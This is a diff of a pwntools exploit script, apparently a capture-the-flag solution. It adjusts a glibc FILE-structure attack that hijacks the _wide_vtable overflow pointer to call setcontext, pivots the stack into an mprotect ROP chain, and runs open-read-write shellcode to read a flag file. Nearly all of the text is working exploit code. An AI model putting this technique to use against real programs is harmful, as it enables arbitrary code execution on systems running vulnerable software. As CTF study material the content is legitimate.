@@ -20,7 +20,7 @@ else:
     io = process(fname)
 
 def bpt():
-    if not args.REMOTE:
+    if not args.REMOTE and args.DEBUG:
         gdb.attach(io)
     pause()
 
@@ -50,7 +50,7 @@ def delete(i):
 
 def orw(addr):
     sh = shellcraft
-    payload = sh.open('flag.txt')
+    payload = sh.open('flag')
     payload += sh.read(3, addr, 0x100)
     payload += sh.write(1, addr, 0x100)
     payload += sh.exit(233)
@@ -119,28 +119,25 @@ def exp():
         # fake_FILE end, but fake_IO_wide_data still have some members.
         0,
         _wide_vtable,   # +0xe8 == fake_wide_data + 0xe0, _wide_vtable
-        setcontext,       # +0xf0 == fake_wide_data + 0xe8, _wide_vtable->__overflow
+        setcontext,     # +0xf0 == fake_wide_data + 0xe8, _wide_vtable->__overflow
     ])
 
-    ucontext = flat([
-        b'\0'*0x28,
-        0,          # +0x28: r8
-        0,          # +0x30: r9
-        b'\0'*0x10,
-        0,          # +0x48: r12
-        0,          # +0x50: r13
-        0,          # +0x58: r14
-        0,          # +0x60: r15
-        heap_base,  # +0x68: rdi
-        0x21000,    # +0x70: rsi
-        0,          # +0x78: rbp
-        0,          # +0x80: rbx
-        7,          # +0x88: rdx
-        0,          # +0x90: ?? 
-        0,          # +0x98: rcx
-        addr_rop,   # +0xa0: rsp 
-        mprotect    # +0xa8: rip
-    ])
+    ucontext = flat({
+        0x28: 0,          # +0x28: r8
+        0x30: 0,          # +0x30: r9
+        0x48: 0,          # +0x48: r12
+        0x50: 0,          # +0x50: r13
+        0x58: 0,          # +0x58: r14
+        0x60: 0,          # +0x60: r15
+        0x68: heap_base,  # +0x68: rdi
+        0x70: 0x21000,    # +0x70: rsi
+        0x78: 0,          # +0x78: rbp
+        0x80: 0,          # +0x80: rbx
+        0x88: 7,          # +0x88: rdx
+        0x98: 0,          # +0x98: rcx
+        0xa0: addr_rop,   # +0xa0: rsp 
+        0xa8: mprotect    # +0xa8: rip
+    })
     assert(len(ucontext) == 0xb0)
 
     payload = fake_FILE.ljust(0x100-0x10, b'\0') + ucontext
